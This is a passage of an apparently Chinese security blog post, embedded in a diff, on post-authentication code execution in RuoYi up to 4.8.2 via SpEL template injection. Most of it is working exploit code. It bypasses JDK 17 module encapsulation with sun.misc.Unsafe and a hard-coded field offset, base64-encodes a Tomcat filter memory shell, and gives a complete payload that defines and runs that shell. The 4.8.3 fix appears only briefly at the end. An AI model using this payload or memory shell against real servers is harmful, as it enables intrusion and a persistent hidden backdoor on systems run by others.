c.close();<br>                writer.write(o);<br>                writer.flush();<br>                writer.close();<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                chain.doFilter(request,response);<br>            &#125;<br>        &#125; <span class="hljs-keyword">catch</span> (Exception var8) &#123;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">destroy</span><span class="hljs-params">()</span> &#123;<br><br>    &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure>
+
+<h3 id="攻击思路"><a href="#攻击思路" class="headerlink" title="攻击思路"></a>攻击思路</h3><p>获取当前上下文的 ClassLoader来加载base64解码后的恶意字节码。</p>
+<h3 id="获取当前上下文的-ClassLoader"><a href="#获取当前上下文的-ClassLoader" class="headerlink" title="获取当前上下文的 ClassLoader"></a>获取当前上下文的 ClassLoader</h3><p>在 SpEL 表达式中，我们可以通过链式调用（反射或者静态方法）来获取到当前的线程上下文类加载器，或者直接从 Request 对象中提取。</p>
+<p><strong>方式 1：通过当前线程获取</strong></p>
+<p>Web 容器在处理一个 HTTP 请求时，会把当前 Web 应用的 <code>WebAppClassLoader</code>绑定到处理这个请求的线程上。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">T(java.lang.Thread).currentThread().getContextClassLoader()<br></code></pre></td></tr></table></figure>
+
+<ul>
+<li><strong>优点</strong>：不需要依赖 Spring 的特定类，只要是在 Web 请求线程内触发的 SpEL（绝大多数 Web 漏洞都是），就能稳定拿到当前应用的 ClassLoader。</li>
+</ul>
+<p><strong>方式 2：通过 Spring 上下文获取（针对若依&#x2F;Spring 框架）</strong></p>
+<p>利用 Spring 提供的 <code>RequestContextHolder</code>获取当前的 Request，顺藤摸瓜拿到 ServletContext，进而拿到 ClassLoader。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">T(org.springframework.web.context.request.RequestContextHolder).currentRequestAttributes().getRequest().getServletContext().getClassLoader()<br></code></pre></td></tr></table></figure>
+
+<ul>
+<li><strong>优点</strong>：非常稳定，百分百拿到的就是处理当前 Spring MVC 逻辑的那个最准确的类加载器。</li>
+</ul>
+<p><strong>方式 3：通过已知加载的 Spring 类获取</strong></p>
+<p>随便找一个肯定是由 <code>WebAppClassLoader</code>加载的 Spring 核心类，获取它的 ClassLoader。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">T(org.springframework.web.servlet.DispatcherServlet).class.getClassLoader()<br></code></pre></td></tr></table></figure>
+
+<p>这里使用方式1：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs plain">#Thread_class=&#x27;&#x27;.getClass().forName(&#x27;java.lang.Thread&#x27;),<br>#ContextClassLoader=#MethodUtils.invokeStaticMethod(#Thread_class,&#x27;currentThread&#x27;).getContextClassLoader(),<br></code></pre></td></tr></table></figure>
+
+<h3 id="踩坑"><a href="#踩坑" class="headerlink" title="踩坑"></a>踩坑</h3><h4 id="setAccessible-true-jdk"><a href="#setAccessible-true-jdk" class="headerlink" title="setAccessible(true) (jdk&lt;9)"></a>setAccessible(true) (jdk&lt;9)</h4><p>拿到 ClassLoader后，因为<code>defineClass</code> 方法是<code>protected</code>修饰的， SpEL 不能直接调用 <code>protected </code>方法。为了绕过这个限制，在 SpEL 中通常会结合反射和Unsafe类来强行调用。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs plain">// 利用反射，把 ClassLoader 里的 defineClass 方法强行设置为可访问（突破 protected 限制）<br>#defineClassMethod = T(java.lang.ClassLoader).getDeclaredMethod(&quot;defineClass&quot;, T(byte[]).class, int.class, int.class);<br>#defineClassMethod.setAccessible(true);<br></code></pre></td></tr></table></figure>
+
+<p>但是这个没成功，因为我当前jdk版本是17，报错<code>module java.base does not &quot;opens java.lang&quot; to unnamed module</code>。这是触发了<strong>JDK 9+ 的模块化系统（Jigsaw）与强封装机制</strong>。</p>
+<ul>
+<li>JVM 启动时，核心库（如 <code>java.lang</code>）被放在了 <code>java.base</code>这个模块中。</li>
+<li>默认情况下，<code>java.base</code>模块 <strong>不再向外部（包括恶意 SpEL 表达式所在的未命名模块）开放</strong>它的内部 API 和非 public 成员。</li>
+<li>当调用 <code>#defineClassMethod.setAccessible(true)</code>时，底层会触发 <code>checkCanSetAccessible</code>安全检查。JVM 发现有人试图破坏 <code>java.base</code>的封装，直接抛出 <code>InaccessibleObjectException</code>拒绝访问。</li>
+</ul>
+<h4 id="Unsafe类（jdk9-）"><a href="#Unsafe类（jdk9-）" class="headerlink" title="Unsafe类（jdk9+）"></a><code>Unsafe</code>类（jdk9+）</h4><p><code>Unsafe</code>类提供了直接操作内存级别的底层 API，并且由于大量底层框架（如 Spring、Netty）都严重依赖它，官方在模块化时“投鼠忌器”，把它放到了 <code>jdk.unsupported</code>模块中，并<strong>默认对外开放</strong>。</p>
+<p><strong>绕过原理拆解：</strong></p>
+<ol>
+<li><code>setAccessible(true)</code>的底层源码，其实仅仅是把 <code>AccessibleObject</code>父类中的一个布尔类型属性 <code>override</code>赋值为 <code>true</code>。</li>
+<li>只要 <code>override == true</code>，Java 就会跳过所有的访问权限检查。</li>
+<li>既然 <code>setAccessible</code>被模块化系统拦截了，我们就用 <code>Unsafe</code>提供的方法，找到 <code>defineClassMethod</code>这个对象内存里的 <code>override</code>属性的<strong>偏移量（Offset）</strong>。</li>
+<li>然后通过 <code>Unsafe.putBoolean()</code>，直接在内存里把这个布尔值强行改成 <code>true</code>。</li>
+</ol>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// 1. 利用反射获取 sun.misc.Unsafe 的单例对象 theUnsafe</span><br><span class="hljs-comment">// 注意：sun.misc 包即使在高版本 JDK 中也是开放的，所以这里的 setAccessible 会成功</span><br>#unsafeClass = T(sun.misc.Unsafe),<br>#theUnsafeField = #unsafeClass.getDeclaredField(<span class="hljs-string">&#x27;theUnsafe&#x27;</span>),<br>#theUnsafeField.setAccessible(<span class="hljs-literal">true</span>),<br>#unsafe = #theUnsafeField.get(<span class="hljs-literal">null</span>),<br><br><span class="hljs-comment">// 2. 拿到我们想要的 defineClass 方法对象（复用你的逻辑）</span><br>#clazz = T(java.lang.ClassLoader),<br>#defineClassMethod = #clazz.getDeclaredMethod(<span class="hljs-string">&#x27;defineClass&#x27;</span>, T(<span class="hljs-type">byte</span>[]), T(Integer).TYPE, T(Integer).TYPE),<br><br><span class="hljs-comment">// 3. 核心黑魔法：获取 AccessibleObject 类中 override 属性的内存偏移量</span><br>#overrideField = T(java.lang.reflect.AccessibleObject).getDeclaredField(<span class="hljs-string">&#x27;override&#x27;</span>),<br>#offset = #unsafe.objectFieldOffset(#overrideField),<br><br><span class="hljs-comment">// 4. 绕过模块化系统，直接在内存中把 defineClassMethod 的 override 值改为 true</span><br>#unsafe.putBoolean(#defineClassMethod, #offset, <span class="hljs-literal">true</span>)<br><br><span class="hljs-comment">// #evilClass = #defineClassMethod.invoke(#classLoader, #byteCode, 0, #byteCode.length)</span><br></code></pre></td></tr></table></figure>
+
+<p>在jdk17调用unsafe类的到时候报错：<code>#overrideField=&#39;&#39;.getClass().forName(&#39;java.lang.reflect.AccessibleObject&#39;).getDeclaredField(&#39;override&#39;)</code></p>
+<p><code>java.lang.NoSuchFieldException: override</code></p>
+<ul>
+<li><strong>现象</strong>：<code>AccessibleObject</code>类里面明明有 <code>override</code>这个属性，但当你调用 <code>getDeclaredField(&quot;override&quot;)</code>时，JVM 内部的 <code>Reflection.filterFields</code>方法会进行拦截，强行把这个属性从结果列表中剔除。</li>
+<li><strong>结果</strong>：拿不到这个 <code>Field</code>对象，自然就无法把它传给 <code>Unsafe.objectFieldOffset()</code>来获取内存偏移量。获取不到偏移量，修改内存的计划就泡汤了。</li>
+</ul>
+<h4 id="盲狙内存偏移量"><a href="#盲狙内存偏移量" class="headerlink" title="盲狙内存偏移量"></a>盲狙内存偏移量</h4><p>如果不能通过正常 API 算出 <code>override</code>的内存偏移量，那我们就<strong>直接硬编码写死偏移量。</strong></p>
+<p>这就涉及到了底层 JVM 的 **Java 对象内存布局 (JOL, Java Object Layout)**。</p>
+<p>我们来解剖一下 <code>Method</code>对象的内存结构：</p>
+<ol>
+<li>**对象头 (Object Header)**：在 64 位 JVM 中，默认开启了指针压缩（Compressed Oops）。对象头固定占用 <strong>12 个字节</strong>。</li>
+<li><strong>父类属性</strong>：排在对象头后面的，是最高级父类的属性。<code>Method</code>继承自 <code>Executable</code>，<code>Executable</code>继承自 <code>AccessibleObject</code>。而 <code>AccessibleObject</code>里面唯一的、也是最先排列的属性，就是 <code>boolean override</code>。</li>
+<li><strong>结论</strong>：<code>override</code>属性在内存中的物理位置是完全固定的，<strong>它永远紧贴在对象头之后，偏移量精确等于 12。</strong></li>
+</ol>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// 1. 获取 Unsafe 对象</span><br>#unsafeClass = T(sun.misc.Unsafe),<br>#theUnsafeField = #unsafeClass.getDeclaredField(<span class="hljs-string">&#x27;theUnsafe&#x27;</span>),<br>#theUnsafeField.setAccessible(<span class="hljs-literal">true</span>),<br>#unsafe = #theUnsafeField.get(<span class="hljs-literal">null</span>),<br><br><span class="hljs-comment">// 2. 拿到受保护的 defineClass 方法</span><br>#clazz = T(java.lang.ClassLoader),<br>#defineClassMethod = #clazz.getDeclaredMethod(<span class="hljs-string">&#x27;defineClass&#x27;</span>, T(<span class="hljs-type">byte</span>[]), T(Integer).TYPE, T(Integer).TYPE),<br><br><span class="hljs-comment">// 3. 终极黑魔法：直接盲写内存偏移量 12</span><br><span class="hljs-comment">// (如果目标 JVM 没开启指针压缩，偏移量是 16。实战中盲狙 12 能覆盖 99% 的 64位环境)</span><br>#unsafe.putBoolean(#defineClassMethod, <span class="hljs-number">12</span>, <span class="hljs-literal">true</span>),<br><br><span class="hljs-comment">// 4. 现在可以执行了</span><br>#evilClass = #defineClassMethod.invoke(#classLoader, #byteCode, <span class="hljs-number">0</span>, #byteCode.length)<br></code></pre></td></tr></table></figure>
+
+<h3 id="poc"><a href="#poc" class="headerlink" title="poc"></a>poc</h3><p>以下代码把恶意类字节码转化成base64输出。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> com.Memshell.tomcat.FilterShell;<br><br><span class="hljs-keyword">import</span> java.io.ByteArrayOutputStream;<br><span class="hljs-keyword">import</span> java.io.InputStream;<br><span class="hljs-keyword">import</span> java.util.Base64;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ClassToBase64</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-comment">// 1. 获取目标类的 Class 对象</span><br>            Class&lt;?&gt; clazz = FilterShell.class;<br><br>            <span class="hljs-comment">// 2. 将类名转换为对应的 .class 文件路径名格式</span><br>            <span class="hljs-type">String</span> <span class="hljs-variable">className</span> <span class="hljs-operator">=</span> clazz.getSimpleName() + <span class="hljs-string">&quot;.class&quot;</span>;<br><br>            <span class="hljs-comment">// 3. 通过当前类的 ClassLoader 以流的形式读取字节码</span><br>            <span class="hljs-type">InputStream</span> <span class="hljs-variable">inputStream</span> <span class="hljs-operator">=</span> clazz.getResourceAsStream(className);<br><br>            <span class="hljs-keyword">if</span> (inputStream == <span class="hljs-literal">null</span>) &#123;<br>                System.out.println(<span class="hljs-string">&quot;找不到类的字节码&quot;</span>);<br>                <span class="hljs-keyword">return</span>;<br>            &#125;<br><br>            <span class="hljs-comment">// 4. 将 InputStream 读入字节数组</span><br>            <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">baos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>            <span class="hljs-type">byte</span>[] buffer = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[<span class="hljs-number">1024</span>];<br>            <span class="hljs-type">int</span> len;<br>            <span class="hljs-keyword">while</span> ((len = inputStream.read(buffer)) != -<span class="hljs-number">1</span>) &#123;<br>                baos.write(buffer, <span class="hljs-number">0</span>, len);<br>            &#125;<br>            inputStream.close();<br><br>            <span class="hljs-comment">// 5. 获取完整的字节码字节数组</span><br>            <span class="hljs-type">byte</span>[] classBytes = baos.toByteArray();<br><br>            <span class="hljs-comment">// 6. Base64 编码</span><br>            <span class="hljs-type">String</span> <span class="hljs-variable">base64Class</span> <span class="hljs-operator">=</span> Base64.getEncoder().encodeToString(classBytes);<br><br>            System.out.println(<span class="hljs-string">&quot;类的字节码 Base64 编码为:&quot;</span>);<br>            System.out.println(base64Class);<br><br>        &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>            e.printStackTrace();<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>然后url编码后嵌入下面的poc中：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs java">$__|&#123;#response.getWriter().print(&#123;<br>#MethodUtils=<span class="hljs-string">&quot;&quot;</span>.getClass().forName(<span class="hljs-string">&#x27;org.apache.commons.lang3.reflect.MethodUtils&#x27;</span>).newInstance(),<br>#evilClass_bytes=<span class="hljs-string">&#x27;&#x27;</span>.getClass().forName(<span class="hljs-string">&#x27;java.util.Base64&#x27;</span>).getDecoder().decode(<span class="hljs-string">&#x27;base64编码，url编码后的恶意字节码&#x27;</span>),<br><br>#Thread_class=<span class="hljs-string">&#x27;&#x27;</span>.getClass().forName(<span class="hljs-string">&#x27;java.lang.Thread&#x27;</span>),<br>#ContextClassLoader=#MethodUtils.invokeStaticMethod(#Thread_class,<span class="hljs-string">&#x27;currentThread&#x27;</span>).getContextClassLoader(),<br><br>#unsafeClass=<span class="hljs-string">&#x27;&#x27;</span>.getClass().forName(<span class="hljs-string">&#x27;sun.misc.Unsafe&#x27;</span>),<br>#theUnsafeField=#unsafeClass.getDeclaredField(<span class="hljs-string">&#x27;theUnsafe&#x27;</span>),<br>#theUnsafeField.setAccessible(<span class="hljs-literal">true</span>),<br>#unsafe=#theUnsafeField.get(<span class="hljs-literal">null</span>),<br><br>#ClassLoader=<span class="hljs-string">&#x27;&#x27;</span>.getClass().forName(<span class="hljs-string">&#x27;java.lang.ClassLoader&#x27;</span>),<br>#defineClassMethod=#MethodUtils.invokeMethod(#ClassLoader,<span class="hljs-string">&#x27;getDeclaredMethod&#x27;</span>,&#123;<span class="hljs-string">&#x27;defineClass&#x27;</span>,<span class="hljs-string">&#x27;&#x27;</span>.getClass().forName(<span class="hljs-string">&#x27;[B&#x27;</span>),<span class="hljs-number">1.</span>TYPE,<span class="hljs-number">1.</span>TYPE&#125;),<br>    <br>#unsafe.putBoolean(#defineClassMethod, <span class="hljs-number">12</span>, <span class="hljs-literal">true</span>),<br><br>#evilClass=#defineClassMethod.invoke(#ContextClassLoader, #evilClass_bytes, <span class="hljs-number">0</span>, #evilClass_bytes.length),<br>#evilClass.newInstance()<br>&#125;)&#125;|__<br></code></pre></td></tr></table></figure>
+
+<p><img src="/./img/ruoyi4-8-2/1778656736417-209bf95d-b3be-4cd8-bbcf-7b4a92f5869f.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/./img/ruoyi4-8-2/1778656752567-91f690e1-5d20-48c9-884c-2518797ae3cb.png" srcset="/img/loading.gif" lazyload></p>
+<h2 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h2><p>在4.8.3版本中，模版名称固定，用户不可控。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@RequiresPermissions(&quot;monitor:cache:view&quot;)</span><br><span class="hljs-meta">@PostMapping(&quot;/getNames&quot;)</span><br><span class="hljs-keyword">public</span> String <span class="hljs-title function_">getCacheNames</span><span class="hljs-params">(ModelMap mmap)</span><br>&#123;<br>    mmap.put(<span class="hljs-string">&quot;cacheNames&quot;</span>, cacheService.getCacheNames());<br>    <span class="hljs-keyword">return</span> prefix + <span class="hljs-string">&quot;/cache::fragment-cache-names&quot;</span>;<br>&#125;<br><br><span class="hljs-meta">@RequiresPermissions(&quot;monitor:cache:view&quot;)</span><br><span class="hljs-meta">@PostMapping(&quot;/getKeys&quot;)</span><br><span class="hljs-keyword">public</span> String <span class="hljs-title function_">getCacheKeys</span><span class="hljs-params">(String cacheName, ModelMap mmap)</span><br>&#123;<br>    mmap.put(<span class="hljs-string">&quot;cacheName&quot;</span>, cacheName);<br>    mmap.put(<span class="hljs-string">&quot;cacheKeys&quot;</span>, cacheService.getCacheKeys(cacheName));<br>    <span class="hljs-keyword">return</span> prefix + <span class="hljs-string">&quot;/cache::fragment-cache-kyes&quot;</span>;<br>&#125;<br><br><span class="hljs-meta">@RequiresPermissions(&quot;monitor:cache:view&quot;)</span><br><span class="hljs-meta">@PostMapping(&quot;/getValue&quot;)</span><br><span class="hljs-keyword">public</span> String <span class="hljs-title function_">getCacheValue</span><span class="hljs-params">(String cacheName, String cacheKey, ModelMap mmap)</span><br>&#123;<br>    mmap.put(<span class="hljs-string">&quot;cacheName&quot;</span>, cacheName);<br>    mmap.put(<span class="hljs-string">&quot;cacheKey&quot;</span>, cacheKey);<br>    mmap.put(<span class="hljs-string">&quot;cacheValue&quot;</span>, cacheService.getCacheValue(cacheName, cacheKey));<br>    <span class="hljs-keyword">return</span> prefix + <span class="hljs-string">&quot;/cache::fragment-cache-value&quot;</span>;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/JAVA/" class="category-chain-item">JAVA</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/JAVA/" class="print-no-link">#JAVA</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>RuoYi&lt;=4.8.2后台代码执行</div>
+      <div>http://example.com/2026/05/13/RuoYi4-8-2/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>Infernity</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2026年5月13日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-cc-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2026/01/14/JDBC%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" title="JDBC反序列化">
+                        <span class="hidden-mobile">JDBC反序列化</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+    <div class="statistics">
+  
+  
+
+  
+    
+      <span id="busuanzi_container_site_pv" style="display: none">
+        总访问量 
+        <span id="busuanzi_value_site_pv"></span>
+         次
+      </span>
+    
+    
+      <span id="busuanzi_container_site_uv" style="display: none">
+        总访客数 
+        <span id="busuanzi_value_site_uv"></span>
+         人
+      </span>
+    
+    
+
+  
+
+</div>
+
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/5.0.0/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
